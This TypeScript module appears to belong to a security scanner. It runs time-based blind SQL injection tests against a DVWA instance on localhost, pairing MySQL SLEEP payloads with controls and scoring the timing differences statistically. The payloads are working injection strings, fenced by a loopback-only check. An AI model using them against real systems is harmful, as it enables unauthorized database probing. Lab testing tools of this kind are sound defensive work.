import { performance } from "node:perf_hooks";
import { finding } from "./findings.js";
import type { ScanResult } from "./model.js";

const LOOPBACK_HOSTS = new Set(["localhost", "127.0.0.1", "::1"]);

export interface TimingExperiment {
  name: string;
  positive: string;
  negative: string;
  expectedDelayMs: number;
}

export interface TimingMeasurementSet {
  timesMs: number[];
  timeouts: number;
  errors: number;
  medianMs?: number;
  madMs?: number;
}

export interface TimingExperimentResult {
  name: string;
  expectedDelayMs: number;
  negative: TimingMeasurementSet;
  positive: TimingMeasurementSet;
  confirmed: boolean;
  confidence: "HIGH" | "MEDIUM" | "LOW" | "INCONCLUSIVE";
  reason: string;
  deltaMs?: number;
  thresholdMs?: number;
  observedJitterMs?: number;
}

export interface TimingDifferentialResult {
  target: string;
  samples: number;
  timeoutMs: number;
  baseline: TimingMeasurementSet;
  experiments: TimingExperimentResult[];
  confirmed: number;
  highConfidence: number;
  conclusion:
    | "STRONG_EVIDENCE"
    | "SUSPICIOUS"
    | "NO_CONSISTENT_EVIDENCE"
    | "INCONCLUSIVE";
}

export const DVWA_TIMING_EXPERIMENTS: TimingExperiment[] = [
  {
    name: "AND SLEEP",
    positive: "1' AND SLEEP(5)-- ",
    negative: "1' AND SLEEP(0)-- ",
    expectedDelayMs: 5_000,
  },
  {
    name: "Nested SELECT SLEEP",
    positive: "1' AND (SELECT 1 FROM (SELECT SLEEP(5)) a)-- ",
    negative: "1' AND (SELECT 1 FROM (SELECT SLEEP(0)) a)-- ",
    expectedDelayMs: 5_000,
  },
  {
    name: "Boolean IF + SLEEP",
    positive: "1' OR IF(1=1,SLEEP(5),0)-- ",
    negative: "1' OR IF(1=2,SLEEP(5),0)-- ",
    expectedDelayMs: 5_000,
  },
];

function median(values: number[]): number | undefined {
  if (!values.length) return undefined;
  const sorted = [...values].sort((a, b) => a - b);
  const middle = Math.floor(sorted.length / 2);
  if (sorted.length % 2) return sorted[middle];
  return (sorted[middle - 1]! + sorted[middle]!) / 2;
}

function mad(values: number[], center: number | undefined): number | undefined {
  if (!values.length || center === undefined) return undefined;
  return median(values.map((value) => Math.abs(value - center)));
}

function summarize(
  timesMs: number[],
  timeouts: number,
  errors: number,
): TimingMeasurementSet {
  const medianMs = median(timesMs);
  return {
    timesMs,
    timeouts,
    errors,
    ...(medianMs === undefined
      ? {}
      : { medianMs, madMs: mad(timesMs, medianMs) }),
  };
}

function validateLoopbackTarget(target: string): URL {
  const url = new URL(target);
  if (!["http:", "https:"].includes(url.protocol))
    throw new Error("Timing lab target must use HTTP(S).");
  const hostname = url.hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (!LOOPBACK_HOSTS.has(hostname))
    throw new Error(
      "Timing SQLi lab is restricted to localhost/loopback targets.",
    );
  if (url.username || url.password || url.search || url.hash)
    throw new Error("Timing lab target must not embed credentials, query, or fragment.");
  // Resolve localhost to a literal loopback IP before fetch so host-file or
  // resolver changes cannot turn a local-only probe into remote traffic.
  if (hostname === "localhost") url.hostname = "127.0.0.1";
  return url;
}

async function measure(
  target: URL,
  payload: string,
  options: {
    timeoutMs: number;
    phpSessionId: string;
    securityLevel: "low";
    responseMarker?: string;
    fetchImpl: typeof fetch;
  },
): Promise<number> {
  const url = new URL(target);
  url.searchParams.set("id", payload);
  url.searchParams.set("Submit", "Submit");

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), options.timeoutMs);
  const started = performance.now();
  try {
    const response = await options.fetchImpl(url, {
      method: "GET",
      redirect: "manual",
      signal: controller.signal,
      headers: {
        accept: "text/html,application/xhtml+xml",
        cookie: `PHPSESSID=${options.phpSessionId}; security=${options.securityLevel}`,
        "user-agent": "REAPER-Local-Timing-Lab/0.2",
      },
    });
    const elapsed = performance.now() - started;

    if ([301, 302, 303, 307, 308].includes(response.status))
      throw new Error("DVWA session redirected; refresh the local PHPSESSID.");
    if (response.status !== 200)
      throw new Error(`Unexpected DVWA HTTP status ${response.status}.`);

    const body = await response.text();
    if (options.responseMarker && !body.includes(options.responseMarker))
      throw new Error(
        "Unexpected DVWA response; session or target may be invalid.",
      );

    return elapsed;
  } finally {
    clearTimeout(timeout);
  }
}

async function collect(
  target: URL,
  payload: string,
  options: {
    samples: number;
    timeoutMs: number;
    phpSessionId: string;
    securityLevel: "low";
    responseMarker?: string;
    fetchImpl: typeof fetch;
  },
): Promise<TimingMeasurementSet> {
  const timesMs: number[] = [];
  let timeouts = 0;
  let errors = 0;

  for (let i = 0; i < options.samples; i++) {
    try {
      timesMs.push(await measure(target, payload, options));
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") timeouts++;
      else errors++;
    }
  }
  return summarize(timesMs, timeouts, errors);
}

async function collectPaired(
  target: URL,
  negativePayload: string,
  positivePayload: string,
  options: {
    samples: number;
    timeoutMs: number;
    phpSessionId: string;
    securityLevel: "low";
    responseMarker?: string;
    fetchImpl: typeof fetch;
  },
): Promise<{ negative: TimingMeasurementSet; positive: TimingMeasurementSet }> {
  const negativeTimes: number[] = [];
  const positiveTimes: number[] = [];
  let negativeTimeouts = 0;
  let positiveTimeouts = 0;
  let negativeErrors = 0;
  let positiveErrors = 0;

  const observe = async (payload: string, positive: boolean): Promise<void> => {
    try {
      const elapsed = await measure(target, payload, options);
      (positive ? positiveTimes : negativeTimes).push(elapsed);
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") {
        if (positive) positiveTimeouts++;
        else negativeTimeouts++;
      } else if (positive) positiveErrors++;
      else negativeErrors++;
    }
  };

  for (let i = 0; i < options.samples; i++) {
    // Alternating control order reduces bias from monotonic server load drift.
    if (i % 2 === 0) {
      await observe(negativePayload, false);
      await observe(positivePayload, true);
    } else {
      await observe(positivePayload, true);
      await observe(negativePayload, false);
    }
  }

  return {
    negative: summarize(negativeTimes, negativeTimeouts, negativeErrors),
    positive: summarize(positiveTimes, positiveTimeouts, positiveErrors),
  };
}

function analyze(
  baseline: TimingMeasurementSet,
  negative: TimingMeasurementSet,
  positive: TimingMeasurementSet,
  expectedDelayMs: number,
): Omit<
  TimingExperimentResult,
  "name" | "expectedDelayMs" | "negative" | "positive"
> {
  const totalPositive =
    positive.timesMs.length + positive.timeouts + positive.errors;
  const positiveTimeoutRatio =
    totalPositive === 0 ? 0 : positive.timeouts / totalPositive;
  const totalNegative =
    negative.timesMs.length + negative.timeouts + negative.errors;
  const negativeTimeoutRatio =
    totalNegative === 0 ? 0 : negative.timeouts / totalNegative;

  if (
    baseline.timesMs.length >= 3 &&
    baseline.timeouts === 0 &&
    baseline.errors === 0 &&
    negative.timesMs.length >= 3 &&
    negative.timeouts === 0 &&
    negative.errors === 0 &&
    positive.errors === 0 &&
    positiveTimeoutRatio >= 0.6 &&
    negativeTimeoutRatio === 0
  ) {
    return {
      confirmed: true,
      confidence: "HIGH",
      reason:
        "Positive control repeatedly exceeded timeout while the negative control remained responsive.",
    };
  }

  if (
    baseline.errors > 0 ||
    negative.errors > 0 ||
    positive.errors > 0 ||
    baseline.timeouts > 0 ||
    negative.timeouts > 0 ||
    positive.timeouts > 0 ||
    baseline.timesMs.length < 3 ||
    negative.timesMs.length < 3 ||
    positive.timesMs.length < 3 ||
    baseline.medianMs === undefined ||
    negative.medianMs === undefined ||
    positive.medianMs === undefined
  ) {
    return {
      confirmed: false,
      confidence: "INCONCLUSIVE",
      reason: "Insufficient valid samples for differential timing analysis.",
    };
  }

  const deltaMs = positive.medianMs - negative.medianMs;
  const observedJitterMs = Math.max(baseline.madMs ?? 0, negative.madMs ?? 0);
  const thresholdMs = Math.max(
    expectedDelayMs * 0.8,
    observedJitterMs * 6,
    Math.min(500, expectedDelayMs * 0.25),
  );
  const confirmed = deltaMs >= thresholdMs;
  const confidence = confirmed
    ? observedJitterMs < 250 && deltaMs >= expectedDelayMs * 0.9
      ? "HIGH"
      : "MEDIUM"
    : "LOW";

  return {
    confirmed,
    confidence,
    reason: confirmed
      ? "Positive/negative timing delta is consistent with the expected delay."
      : "Observed timing delta is below the required differential threshold.",
    deltaMs,
    thresholdMs,
    observedJitterMs,
  };
}

export async function runLocalTimingSqliLab(
  target: string,
  options: {
    phpSessionId: string;
    securityLevel?: "low";
    samples?: number;
    timeoutMs?: number;
    baselinePayload?: string;
    experiments?: TimingExperiment[];
    responseMarker?: string;
    fetchImpl?: typeof fetch;
  },
): Promise<TimingDifferentialResult> {
  const url = validateLoopbackTarget(target);
  if (!/^[A-Za-z0-9,-]{1,512}$/.test(options.phpSessionId))
    throw new Error("A valid bounded DVWA PHPSESSID is required.");
  if ((options.securityLevel ?? "low") !== "low")
    throw new Error(
      'Timing SQLi lab currently requires DVWA security level "low".',
    );

  const samples = options.samples ?? 5;
  if (!Number.isSafeInteger(samples) || samples < 3 || samples > 9)
    throw new Error("Timing lab samples must be an integer between 3 and 9.");

  const timeoutMs = options.timeoutMs ?? 10_000;
  const minimumTimeoutMs = options.fetchImpl ? 25 : 1_000;
  if (
    !Number.isSafeInteger(timeoutMs) ||
    timeoutMs < minimumTimeoutMs ||
    timeoutMs > 15_000
  )
    throw new Error(
      `Timing lab timeout must be between ${minimumTimeoutMs} and 15000 ms.`,
    );

  const fetchImpl = options.fetchImpl ?? fetch;
  const common = {
    samples,
    timeoutMs,
    phpSessionId: options.phpSessionId,
    securityLevel: "low" as const,
    ...(options.responseMarker
      ? { responseMarker: options.responseMarker }
      : {}),
    fetchImpl,
  };

  const experimentDefinitions = options.experiments ?? DVWA_TIMING_EXPERIMENTS;
  if (!experimentDefinitions.length || experimentDefinitions.length > 6)
    throw new Error("Timing lab requires between 1 and 6 experiments.");
  for (const experiment of experimentDefinitions) {
    if (
      !experiment.name ||
      experiment.name.length > 120 ||
      !experiment.positive ||
      !experiment.negative ||
      !Number.isSafeInteger(experiment.expectedDelayMs) ||
      experiment.expectedDelayMs < 50 ||
      experiment.expectedDelayMs > 10_000
    )
      throw new Error("Timing experiment definition is invalid.");
  }

  const baseline = await collect(url, options.baselinePayload ?? "1", common);

  const experiments: TimingExperimentResult[] = [];
  for (const experiment of experimentDefinitions) {
    const { negative, positive } = await collectPaired(
      url,
      experiment.negative,
      experiment.positive,
      common,
    );
    experiments.push({
      name: experiment.name,
      expectedDelayMs: experiment.expectedDelayMs,
      negative,
      positive,
      ...analyze(baseline, negative, positive, experiment.expectedDelayMs),
    });
  }

  const confirmed = experiments.filter((item) => item.confirmed).length;
  const highConfidence = experiments.filter(
    (item) => item.confirmed && item.confidence === "HIGH",
  ).length;
  const inconclusive = experiments.every(
    (item) => item.confidence === "INCONCLUSIVE",
  );

  return {
    target: url.toString(),
    samples,
    timeoutMs,
    baseline,
    experiments,
    confirmed,
    highConfidence,
    conclusion: inconclusive
      ? "INCONCLUSIVE"
      : confirmed >= 2
        ? "STRONG_EVIDENCE"
        : confirmed === 1
          ? "SUSPICIOUS"
          : "NO_CONSISTENT_EVIDENCE",
  };
}

export function toTimingSqliScanResult(
  result: TimingDifferentialResult,
): ScanResult {
  const findings = result.experiments
    .filter((experiment) => experiment.confirmed)
    .map((experiment) =>
      finding(
        {
          ruleId: "REAPER-TIMING-001",
          title: "Repeatable timing differential in an authorized local lab",
          description:
            "Paired positive and negative requests exhibited timing behavior consistent with a delayed execution path. Timing alone does not prove data exposure.",
          severity: result.highConfidence >= 2 ? "HIGH" : "MEDIUM",
          confidence: experiment.confidence === "HIGH" ? "HIGH" : "MEDIUM",
          category: "Offensive Validation",
          file: "runtime:timing-lab",
          line: 1,
          column: 1,
          route: new URL(result.target).pathname,
          evidence: [
            `Experiment: ${experiment.name}`,
            `Samples per control: ${result.samples}`,
            `Expected delay: ${experiment.expectedDelayMs} ms`,
            `Negative median: ${experiment.negative.medianMs ?? "n/a"} ms`,
            `Positive median: ${experiment.positive.medianMs ?? "n/a"} ms`,
            `Differential: ${experiment.deltaMs ?? "timeout-censored"} ms`,
            `Threshold: ${experiment.thresholdMs ?? "n/a"} ms`,
            `Confidence: ${experiment.confidence}`,
          ],
          dataFlow: [],
          recommendation:
            "Use parameterized queries and review the reachable SQL path. Reproduce and remediate in an authorized controlled environment before drawing exploitability conclusions.",
        },
        `${experiment.name}:${experiment.expectedDelayMs}`,
      ),
    );

  return {
    version: "0.2.0",
    root: result.target,
    findings,
    diagnostics:
      result.conclusion === "INCONCLUSIVE"
        ? [{ message: "Local timing evidence was incomplete or controls were unhealthy." }]
        : [],
    graph: { nodes: [], edges: [] },
    metrics: {
      files: 0,
      routes: 0,
      sinks: 0,
      durationMs: 0,
      memoryBytes: 0,
    },
    coverage: { source: false, database: false, runtime: true },
  };
}

function fmt(value: number | undefined): string {
  return value === undefined ? "n/a" : `${(value / 1000).toFixed(3)}s`;
}

export function renderTimingSqliLab(result: TimingDifferentialResult): string {
  const lines = [
    "REAPER LOCAL TIMING SQLi LAB",
    `Target: ${result.target}`,
    `Samples: ${result.samples}`,
    `Baseline median: ${fmt(result.baseline.medianMs)} | MAD: ${fmt(result.baseline.madMs)}`,
    "",
  ];
  for (const item of result.experiments) {
    lines.push(
      `[${item.confirmed ? "!" : " "}] ${item.name}`,
      `    negative median=${fmt(item.negative.medianMs)} MAD=${fmt(item.negative.madMs)} timeouts=${item.negative.timeouts}`,
      `    positive median=${fmt(item.positive.medianMs)} MAD=${fmt(item.positive.madMs)} timeouts=${item.positive.timeouts}`,
      `    delta=${fmt(item.deltaMs)} threshold=${fmt(item.thresholdMs)} confidence=${item.confidence}`,
      `    ${item.reason}`,
      "",
    );
  }
  lines.push(
    `Confirmed: ${result.confirmed}/${result.experiments.length}`,
    `High confidence: ${result.highConfidence}/${result.experiments.length}`,
    `Conclusion: ${result.conclusion}`,
    "",
  );
  return lines.join("\n");
}
